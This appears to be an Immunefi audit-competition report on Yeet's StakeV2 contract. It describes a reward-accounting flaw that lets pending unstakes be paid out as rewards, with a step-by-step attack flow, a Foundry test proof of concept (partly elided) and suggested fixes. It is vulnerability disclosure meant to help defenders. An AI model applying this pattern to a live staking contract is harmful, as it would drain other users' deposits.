# #42527 \[SC-Critical] Critical Balance/Supply Desynchronization Leading to Protocol Insolvency and Loss of User Funds

**Submitted on Mar 24th 2025 at 14:21:13 UTC by @Invcbull for** [**Audit Comp | Yeet**](https://immunefi.com/audit-competition/audit-comp-yeet)

* **Report ID:** #42527
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-yeet/blob/main/src/StakeV2.sol>
* **Impacts:**
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Detail

A critical vulnerability in StakeV2's reward distribution mechanism allows manipulation of `accumulatedDeptRewardsYeet()` through stake/unstake patterns, leading to protocol insolvency and permanent loss of user funds. The issue creates a "bank run" scenario where early unstakers get paid using other users' funds, ultimately leaving late unstakers with total loss of principal.

## Vulnerability Details

* Core Issue

```solidity
function accumulatedDeptRewardsYeet() public view returns (uint256) {
    return stakingToken.balanceOf(address(this)) - totalSupply; 
}
```

The function fails to account for pending unstakes, creating a desynchronization between balanceOf and totalSupply

* Technical Flow\
  Note: I used eth but in this context eth means yeet.

1. Initial State:

```solidity
// Three users stake 100 ETH each
Alice stakes: 100 ETH
Bob stakes: 100 ETH
Victim stakes: 100 ETH
Contract balance: 300 ETH
totalSupply: 300 ETH
```

2. Attack Pattern:

```solidity
// Victim starts unstake
victim.startUnstake(100 ETH);
// since startUnstake reduces totalsupply by unstake amount(100) immediately
// State: balance = 300 ETH, totalSupply = 200 ETH
// Creates fake rewards: 100 ETH

// Protocol distributes "rewards"
executeRewardDistributionYeet(100 ETH)
// Transfers victim's pending unstake tokens
// Contract balance: 200 ETH
```

3. Cascading Insolvency:

```solidity
// Victim unstakes using Alice's tokens
victim.unstake(0)     // Gets 100 ETH
// Balance: 100 ETH

// Alice unstakes using Bob's tokens
alice.unstake(0)      // Gets 100 ETH
// Balance: 0 ETH

// Bob attempts unstake
bob.unstake(0)        // FAILS - No funds left
```

In this case we have two victims

1. Bob : late/last unstaker whose unstake failed due to insufficient contract balance.
2. Victim : whose stake was incorrectly used as reward due to the contracts failure to account for pending unstakes during accumulatedDeptRewardsYeet()

## Impact Details

* Protocol Insolvency:

1. Contract becomes unable to meet staking obligations
2. Each reward distribution reduces available funds
3. Creates unsustainable "first to withdraw" scenario

* Direct Loss of User Funds:

1. Late unstakers lose 100% of principal
2. Not just yield or rewards at risk
3. Permanent and unrecoverable loss

* Systemic Impact:

1. Affects all stakers in the protocol
2. Creates bank run incentive
3. Undermines core protocol functionality

## Proof of Concept

## Proof of Concept

I included this test function in StakeV2.test.sol

```solidity

function test_chainReactionFundLoss() public {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address victim = makeAddr("victim");
    
    // Setup - 100 ETH stakes each
    token.mint(alice, 100 ether);
    token.mint(bob, 100 ether);
    token.mint(victim, 100 ether);
    
    // Initial stakes
    vm.startPrank(alice);
    token.approve(address(stakeV2), 100 ether);
    stakeV2.stake(100 ether);
    vm.stopPrank();
    
    vm.startPrank(bob);
    token.approve(address(stakeV2), 100 ether);
    stakeV2.stake(100 ether);
    vm.stopPrank();
    
    vm.startPrank(victim);
    token.approve(address(stakeV2), 100 ether);
    stakeV2.stake(100 ether);
    
    // Create fake rewards
    stakeV2.startUnstake(100 ether);
    vm.stopPrank();
    
    // Distribute fake rewards
    mockZapper.setReturnValues(0, 100 ether);
    vm.prank(address(this));
    stakeV2.executeRewardDistributionYeet(...);
    
    // Victim unstakes (uses Alice's tokens)
    vm.warp(block.timestamp + 10 days);
    vm.prank(victim);
    stakeV2.unstake(0);
    
    // Alice unstakes (uses Bob's tokens)
    vm.startPrank(alice);
    stakeV2.startUnstake(100 ether);
    vm.warp(block.timestamp + 10 days);
    stakeV2.unstake(0);
    vm.stopPrank();
    
    // Bob loses everything
    vm.startPrank(bob);
    stakeV2.startUnstake(100 ether);
    vm.warp(block.timestamp + 10 days);
    vm.expectRevert();
    stakeV2.unstake(0);
    
    // Verify loss
    assertEq(token.balanceOf(bob), 0, "Bob lost all funds");
    assertEq(token.balanceOf(address(stakeV2)), 0, "Contract insolvent");
}

```

## Recommended Mitigation

To fix this issue kindly consider :

1. Track Pending Unstakes:

```solidity
mapping(address => uint256) public pendingUnstakes;

function accumulatedDeptRewardsYeet() public view returns (uint256) {
    uint256 actualBalance = stakingToken.balanceOf(address(this)) - totalPendingUnstakes;
    require(actualBalance >= totalSupply, "Balance/Supply mismatch");
    return actualBalance - totalSupply;
}
```

Or

2. Safe Reward Distribution:

```solidity
function executeRewardDistributionYeet(...) external {
    uint256 rewards = accumulatedDeptRewardsYeet();
    require(rewards > 0 && rewards <= availableForDistribution(), "Invalid rewards");
    // ... distribution logic
}

function availableForDistribution() internal view returns (uint256) {
    return stakingToken.balanceOf(address(this)) 
           - totalSupply 
           - totalPendingUnstakes;
}
```
